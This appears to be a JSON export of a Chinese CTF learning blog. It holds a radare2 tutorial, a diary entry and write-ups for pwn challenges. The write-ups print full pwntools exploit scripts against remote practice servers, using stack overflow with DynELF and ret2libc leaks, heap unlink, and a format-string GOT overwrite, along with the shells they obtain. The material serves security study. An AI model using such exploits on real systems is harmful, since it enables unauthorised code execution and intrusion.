root@kali:~/heap# one_gadget /lib/x86_64-linux-gnu/libc.so.60x4345e execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x434b2 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xe42ee execve(&quot;/bin/sh&quot;, rsp+0x60, environ)constraints: [rsp+0x60] == NULL#------------------------------------------------------------------------#alloc(255) p.interactive() reference:https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1https://bbs.pediy.com/thread-223461.htm 没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Diary.20181008","slug":"diary-20181008","date":"2018-10-08T13:10:48.000Z","updated":"2018-10-15T12:17:30.737Z","comments":true,"path":"2018/10/08/diary-20181008/","link":"","permalink":"http://siriuswhiter.tk/2018/10/08/diary-20181008/","excerpt":"","text":"下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh …搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦 12345678910&lt;script&gt; (function()&#123; if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123; if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; alert(&apos;Wrong！&apos;); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。这下好了，越来越糟糕 hexo-blog-encrypt 这个组件都不能用。。没办法了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Radare2","slug":"radare2","date":"2018-09-25T02:56:08.000Z","updated":"2018-09-25T13:44:05.207Z","comments":true,"path":"2018/09/25/radare2/","link":"","permalink":"http://siriuswhiter.tk/2018/09/25/radare2/","excerpt":"","text":"之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm 安装git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 使用之后学习使用中逐渐更新常用包含工具： radare2-&gt;整合了所有工具 rabin2-&gt;查看文件格式的 radiff2-&gt;比较文件不同的 rahash2-&gt;各种密码算法，hash算法集成 rasm2-&gt;汇编和反汇编 ragg2-&gt;开发shellcode工具(radare2自己编写的编译器) radare2随便加载个文件,会有一句欢迎语hhhh 123$r2 pwnme -- We only have bugs, features are an unintended side-effect[0x08049090]&gt; //工具找到的入口位置 rabin2查看文件基本信息 123456789101112131415161718192021222324252627282930# rabin2 -I pwnmearch x86baddr 0x8048000binsz 14275bintype elfbits 32canary falsesanitiz falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true rahash2支持超多加解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# rahash2 -L //列举Available Hashes: h md5h sha1h sha256h sha384h sha512h md4h xorh xorpairh parityh entropyh hamdisth pcprinth mod255h xxhashh adler32h luhnh crc8smbush crc15canh crc16h crc16hdlch crc16usbh crc16citth crc24h crc32h crc32ch crc32ecma267h crc32bzip2h crc32dh crc32mpeg2h crc32posixh crc32qh crc32jamcrch crc32xferh crc64h crc64ecmah crc64weh crc64xzh crc64isoAvailable Encoders/Decoders: e base64e base91e punycodeAvailable Crypto Algos: c rc2c rc4c rc6c aes-ecbc aes-cbcc rorc rolc rotc blowfishc cps2c des-ecbc xorc serpent-ecb# rahash2 -a md5 ./pwnme //生成md5哈希./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56 rasm2支持汇编反汇编 ragg2据说可以用来快速开发shellcode？ radiff2支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。 P.S.暂时不晓得有啥用 rafind2在文件中查找字节模式 rarun2用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和 覆盖的默认文件描述符。 rarun2可用于： * 破解小程序 * 模糊测试 * 测试组件 rax2用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示， 十六进制字符串到ASCII之间进行基本转换，八进制到整数等。 它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。 常用命令 i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串 1234567891011[0x08049090]&gt; ie[Entrypoints]vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints[0x08049090]&gt; iz[Strings]Num Vaddr Paddr Len Size Section Type String000 0x00002008 0x0804a008 7 8 (.rodata) ascii /bin/sh001 0x00002010 0x0804a010 5 6 (.rodata) ascii input a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme) 12345678# r2 -A pwnme[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis. -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合。可以使用 ‘fs ‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’). 1234567891011[0x08049090]&gt; fs0 2 * strings1 37 * symbols2 30 * sections3 12 * segments4 5 * relocs5 5 * imports6 2 * functions[0x08049090]&gt; fs strings;f0x0804a008 8 str.bin_sh0x0804a010 6 str.input axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。) 12345678910111213141516171819202122232425-[ functions ]----------------- pdf ---(a) add (x) xrefs (q) quit (jk) next/prev ;-- section..text:(r) rename (c) calls (g) go (tab) column ;-- eip:(d) delete (v) vars (?) help (:) enter cmd / (fcn) entry0 50&gt;* 0x08049090 50 entry0 | entry0 (); 0x080490c3 4 fcn.080490c3 | 0x08049090 xor ebp, ebp ; [14] -r-x secti 0x08049070 6 sym.imp.__libc_start_main | 0x08049092 pop esi 0x080490f0 40 sym.deregister_tm_clones | 0x08049093 mov ecx, esp 0x08049130 53 sym.register_tm_clones | 0x08049095 and esp, 0xfffffff0 0x08049170 30 sym.__do_global_dtors_aux | 0x08049098 push eax 0x080491a0 2 entry1.init | 0x08049099 push esp 0x080492b0 2 sym.__libc_csu_fini | 0x0804909a push edx 0x080490e0 4 sym.__x86.get_pc_thunk.bx | 0x0804909b call fcn.080490c3 0x080492b4 20 sym._fini | 0x080490a0 add ebx, 0x2f60 ; &apos;`/&apos; 0x08049250 93 sym.__libc_csu_init | 0x080490a6 lea eax, [ebx - 0x2d50] 0x080490d0 2 sym._dl_relocate_static_pie | 0x080490ac push eax ; func fini 0x08049203 65 sym.main | 0x080490ad lea eax, [ebx - 0x2db0] 0x08049244 4 sym.__x86.get_pc_thunk.ax | 0x080490b3 push eax ; func init 0x08049050 6 sym.imp.puts | 0x080490b4 push ecx ; char **ubp_av 0x080491cd 54 sym.vulnerable | 0x080490b5 push esi ; int argc 0x08049040 6 sym.imp.gets | 0x080490b6 mov eax, sym.main ; 0x8049203 0x080491a2 43 sym.flag | 0x080490bc push eax ; func main 0x08049060 6 sym.imp.system \\ 0x080490bd call sym.imp.__libc_start_main ; int __libc_star 0x08049000 35 sym._init 0x08049080 6 sub.__gmon_start_80 s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。 12345678910111213141516171819202122232425262728293031[0x08049090]&gt; s main[0x08049203]&gt; pdf ;-- main:/ (fcn) sym.main 65| sym.main (int argc, char **argv, char **envp);| ; var int local_8h @ ebp-0x8| ; arg int arg_4h @ esp+0x4| ; DATA XREF from entry0 (0x80490b6)| 0x08049203 8d4c2404 lea ecx, [arg_4h] ; 4| 0x08049207 83e4f0 and esp, 0xfffffff0| 0x0804920a ff71fc push dword [ecx - 4]| 0x0804920d 55 push ebp| 0x0804920e 89e5 mov ebp, esp| 0x08049210 53 push ebx| 0x08049211 51 push ecx| 0x08049212 e82d000000 call sym.__x86.get_pc_thunk.ax| 0x08049217 05e92d0000 add eax, 0x2de9| 0x0804921c 83ec0c sub esp, 0xc| 0x0804921f 8d9010e0ffff lea edx, [eax - 0x1ff0]| 0x08049225 52 push edx ; const char *s| 0x08049226 89c3 mov ebx, eax| 0x08049228 e823feffff call sym.imp.puts ; int puts(const char *s)| 0x0804922d 83c410 add esp, 0x10| 0x08049230 e898ffffff call sym.vulnerable| 0x08049235 b800000000 mov eax, 0| 0x0804923a 8d65f8 lea esp, [local_8h]| 0x0804923d 59 pop ecx| 0x0804923e 5b pop ebx| 0x0804923f 5d pop ebp| 0x08049240 8d61fc lea esp, [ecx - 4]\\ 0x08049243 c3 ret radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样 12345678910111213141516171819202122232425262728293031323334[0x08049203]&gt; pdcfunction sym.main () &#123; // 1 basic blocks loc_0x8049203: //DATA XREF from entry0 (0x80490b6) ecx = [arg_4h] //4 esp &amp;= 0xfffffff0 //ebp push dword [ecx - 4] push ebp ebp = esp push ebx push ecx sym.__x86.get_pc_thunk.ax () eax += 0x2de9 //obj._GLOBAL_OFFSET_TABLE esp -= 0xc edx = [eax - 0x1ff0] //&quot;input&quot; str.input push edx //const char *s ; (pstr 0x0804a010) &quot;input&quot; ebx = eax //obj._GLOBAL_OFFSET_TABLE int puts(const char * s : (*0x804a010)0x00177fe0 = input) esp += 0x10 sym.vulnerable () eax = 0 esp = [local_8h] pop ecx pop ebx //ebp esp = [ecx - 4] //ebp return(break)&#125; 还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞 .---------------------------------------------------. | [0x8049203] | | ;-- main: | | ;-- eip: | | (fcn) sym.main 65 | | sym.main (int argc, char **argv, char **envp); | | ; var int local_8h @ ebp-0x8 | | ; arg int arg_4h @ esp+0x4 | | ; DATA XREF from entry0 (0x80490b6) | | ; 4 | | lea ecx, [arg_4h] | | and esp, 0xfffffff0 | | push dword [ecx - 4] | | push ebp | | mov ebp, esp | | push ebx | | push ecx | | call sym.__x86.get_pc_thunk.ax;[ga] | | add eax, 0x2de9 | | sub esp, 0xc | | lea edx, [eax - 0x1ff0] | | ; const char *s | | push edx | | mov ebx, eax | | ; int puts(const char *s) | | call sym.imp.puts;[gb] | | add esp, 0x10 | | call sym.vulnerable;[gc] | | mov eax, 0 | | lea esp, [local_8h] | `---------------------------------------------------&apos; 目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"Jarvis OJ-pwn","slug":"jarvis-oj-pwn","date":"2018-09-13T06:17:19.000Z","updated":"2018-10-14T07:23:37.905Z","comments":true,"path":"2018/09/13/jarvis-oj-pwn/","link":"","permalink":"http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/","excerpt":"","text":"开始漫漫刷题之路 level4 - DynELF题目给的东西很少，基本信息如下： 信息main：123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function：123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 保护：只开启了nx。123456&apos;/root/pwnprac/level4&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 分析read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。/bin/sh则可以通过调用read来将其写入bss段，调用即可。 poc1234567891011121314151617181920212223242526272829from pwn import *#sh = process(&apos;./level4&apos;)sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)libc = ELF(&apos;./level4&apos;)bss_add = libc.bss() //直接得到bss段地址def leak(add): //leak函数 pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4) sh.send(pay1) data = sh.recv(4) return data#神奇DynELF工具使用d = DynELF(leak,elf = ELF(&apos;./level4&apos;)) //初始化DynELF模块 sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;) //在libc文件中搜索system函数的地址 print hex(sys_add)pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8) //调用readsh.send(pay2)sh.send(&apos;/bin/sh\\x00&apos;) pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)sh.send(pay3)sh.interactive() 获得shell1234[*] Switching to interactive mode$ whoamictf$ 参考:借助DynELF实现无libc的漏洞利用小结 level3_x64 - 64位参数传递当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸重新下载源文件，问题解决。。。 信息：漏洞函数：明显的栈溢出1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; 思路：整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。 poc：1234567891011121314151617181920212223242526272829303132from pwn import *#context.log_level = &apos;debug&apos;sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)#sh = process(&apos;level3&apos;)pwn = ELF(&apos;level3_x64&apos;)libc = ELF(&apos;libc-2.19.so&apos;)pop_rdi_ret = 0x004006b3 #pop rdi ; retpop_rsi_r15_ret = 0x004006b1 #pop rsi ; pop r15 ; retsys_libc_addr = libc.symbols[&apos;system&apos;]binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()#----------To get write.got--------------# pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1) //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])sh.recvuntil(&quot;Input:\\n&quot;)sh.send(pay1)write_addr = u64(sh.recv(8))#---------call system func---------------#sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addrbinsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addrpay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)sh.send(pay2)sh.interactive() 获得shell： 123$ whoamictf$ —之后再做— level6 - 堆的unlink利用正常的选项类型题 信息main:12345678910111213141516171819202122232425262728293031323334353637int __cdecl main()&#123; unsigned int v0; // eax alarm_func(); main_ptr(); while ( 1 ) &#123; v0 = menu();LABEL_3: switch ( v0 ) &#123; case 1u: list(); continue; case 2u: add(); continue; case 3u: edit(); continue; case 4u: delete(); v0 = menu(); if ( v0 &gt; 5 ) goto LABEL_6; goto LABEL_3; case 5u: puts(&quot;Bye&quot;); return 0; default:LABEL_6: puts(&quot;Invalid!&quot;); break; &#125; &#125;&#125; 问题函数：delete函数未检查inuse位，可以double free，且free完并未清空指针。 12345678910111213141516171819202122int delete()&#123; int v0; // eax int v1; // edx int v3; // eax if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 ) return puts(&quot;No notes yet.&quot;); printf(&quot;Note number: &quot;); v0 = get_num(); if ( v0 &lt; 0 ) return puts(&quot;Invalid number!&quot;); v1 = dword_804A2EC; if ( v0 &gt;= *(_DWORD *)dword_804A2EC ) return puts(&quot;Invalid number!&quot;); --*(_DWORD *)(dword_804A2EC + 4); v3 = v1 + 12 * v0; *(_DWORD *)(v3 + 8) = 0; *(_DWORD *)(v3 + 12) = 0; free(*(void **)(v3 + 16)); return puts(&quot;Done.&quot;);&#125; 同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。 保护：（基本上不用看。。） 123456[*] &apos;/root/pwnprac/freenote_x86&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 思路(有点迷) 首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。 之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) poc（待参透）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *#context.log_level = &apos;debug&apos;context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]local = 0if local: cn = process(&quot;./freenote_x86&quot;) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)else: cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885) bin = ELF(&quot;freenote_x86&quot;) libc = ELF(&quot;libc-2.19.so&quot;)def list_post(): passdef add_post(length,content): cn.sendline(&apos;2&apos;) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def edit_post(idx,length,content): cn.sendline(&apos;3&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx)) cn.recvuntil(&apos;Length&apos;) cn.sendline(str(length)) cn.recvuntil(&apos;Enter&apos;) cn.sendline(content)def del_post(idx): cn.sendline(&apos;4&apos;) cn.recvuntil(&apos;number&apos;) cn.sendline(str(idx))#chunk_list=0x0804A2EC#test=0x08048CC5#-------init-------for i in range(5): add_post(0x80,str(i)*0x80)del_post(3)del_post(1)pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8edit_post(0,0x88,pay)#------------------#--------leak----------cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;a&apos;*0x8)leak_addr = u32(cn.recv(4))cn.recv()heap_base = leak_addr - 0xdb0#offsetchunk0_addr = heap_base + 0x18success(&quot;leak_addr: &quot;+hex(leak_addr))success(&quot;heap_base: &quot;+hex(heap_base))success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))#----------------------#-------unlink--------pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)pay += p32(0x80) + p32(0x88+0x88)edit_post(0,len(pay),pay)del_post(1)#----------------------#--------leak----------pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])pay += &apos;\\x00&apos;*(0x88-len(pay))edit_post(0,len(pay),pay)cn.sendline(&apos;1&apos;)cn.recvuntil(&apos;0. &apos;)cn.recvuntil(&apos;1. &apos;)strtol = cn.recvuntil(&apos;\\x0a&apos;)[:-1]cn.recv()strtol = u32(strtol)system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]success(&quot;strtol: &quot;+hex(strtol))success(&quot;system: &quot;+hex(system))#----------------------#--------hijack&amp;getshell--------edit_post(1,4,p32(system))cn.sendline(&quot;$0&quot;)#----------------------cn.interactive() 获得shell 123Your choice: $ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"pwn-300-Formatting string vulnerability","slug":"pwn-300解析-格式化字符串漏洞利用巩固","date":"2018-09-11T01:51:39.000Z","updated":"2018-09-25T13:44:41.876Z","comments":true,"path":"2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","link":"","permalink":"http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/","excerpt":"","text":"pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。 查看内容及保护main函数为：1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-4Ch] unsigned int v5; // [esp+4Ch] [ebp-Ch] v5 = __readgsdword(0x14u); //canary生成 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); fgets(&amp;s, 64, stdin); //fgets,遇/x00停止 printf(&amp;s); //格式化字符串漏洞 fgets(&amp;s, 64, stdin); printf(&amp;s); return 0;&#125; 查看文件保护仍然是canary 与 栈不可执行； 1234567root@xuewenjie-kali:~/tikool# checksec binary_300[*] &apos;/root/tikool/binary_300&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 查看加载函数发现system函数 加载函数 确定思路想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell； 流程实现确定字符串位置123root@xuewenjie-kali:~/tikool# ./binary_300aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e 即字符串位于第六（相对于）或第七个（相对于） exp如下： 1234567891011121314151617from pwn import *#sh = process(&apos;./binary_300&apos;)sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)libc = ELF(&apos;./binary_300&apos;)printf_got = libc.got[&apos;printf&apos;]system_add = libc.symbols[&apos;system&apos;]payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;) //pwntools自带，用于生成格式化字符串payload；print payloadsh.sendline(payload)sh.recv()sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 成功获得shell12345[*] Switching to interactive mode$ /bin/sh$ whoamictf$","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"format","slug":"format","permalink":"http://siriuswhiter.tk/tags/format/"}]},{"title":"Introduction to pwn 1.3--plt/got","slug":"pwn-入门1-3-plt-got","date":"2018-08-28T04:12:56.000Z","updated":"2018-09-26T13:16:43.727Z","comments":true,"path":"2018/08/28/pwn-入门1-3-plt-got/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/","excerpt":"","text":"&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; 延迟绑定即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。 使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；* plt 与 got文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的） 由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。 ret2libc的实现 文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出； 图一](pwn-入门1-3-plt-got/checksec.png) ![图二 查看应用调用函数plt表，objdump -d -M intel -j .plt pwnme可以看到没有调用system，需要我们利用其它已调用的来泄露； 图三 这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址； 123pwn = ELF(&apos;pwnme&apos;) sh.recvuntil(&apos;flag:&apos;) wri_got = pwn.got[&apos;write&apos;] 构造payload泄露write函数的实际地址 1pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4) 泄露libc中的system与/bin/sh地址 123libc = ELF(&apos;libc-2.19.so&apos;)sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next() 构造payload 1payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr) 因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Introduction to pwn2.3--UAF","slug":"pwn-入门n-n","date":"2018-08-28T03:10:56.000Z","updated":"2018-11-14T12:13:29.836Z","comments":true,"path":"2018/08/28/pwn-入门n-n/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门n-n/","excerpt":"","text":"堆的UAF(use after free)利用学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，只能看了下pwn的tips，开始现学现卖。 原理就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。 根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。 漏洞的简单利用1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include 